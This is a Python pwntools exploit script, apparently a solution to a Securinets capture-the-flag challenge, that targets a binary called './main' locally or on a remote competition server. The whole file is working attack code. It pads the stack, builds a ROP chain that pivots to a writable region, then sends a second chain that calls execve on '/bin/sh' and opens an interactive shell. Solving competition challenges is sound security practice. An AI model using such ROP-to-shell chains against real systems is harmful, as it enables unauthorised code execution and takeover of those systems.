#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./main")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwn.ctf.securinets.tn", 7777)

    return r


def main():
    r = conn()

    ret = 0x0000000000401016
    pop_rsi = 0x000000000040ab23
    pop_rdi = 0x0000000000401f3d
    pop_rsp = 0x0000000000402308
    writeable = 0x00000000004a5000 + 0x100
    readIpt = 0x0000000000401767

    syscall = 0x00000000004121e2
    pop_rax = 0x0000000000431c77
    pop_rdx_rbx = 0x0000000000463367

    rop = p64(pop_rdi) + p64(writeable)
    rop += p64(pop_rsi) + p64(0x200)
    rop += p64(readIpt)
    rop += p64(pop_rsp) + p64(writeable)

    #payload = b"A"*(144)
    print(((144 - len(rop)) // 8))
    payload = p64(ret) * (((144 - len(rop)) // 8))
    payload += rop
    payload += b"\x00"

    r.sendline(b'2')

    sleep(0.5)
    r.sendline(payload)

    # pause()
    sleep(0.5)
    r.sendline(b'3')

    payload = b""
    payload += p64(pop_rdx_rbx) + p64(0) * 2
    payload += p64(pop_rsi) + p64(0)
    payload += p64(pop_rax) + p64(59)
    payload += p64(pop_rdi) + p64(writeable + 8 * 10)
    payload += p64(syscall)
    payload += b"/bin/sh\0"

    sleep(0.3)
    # pause()
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
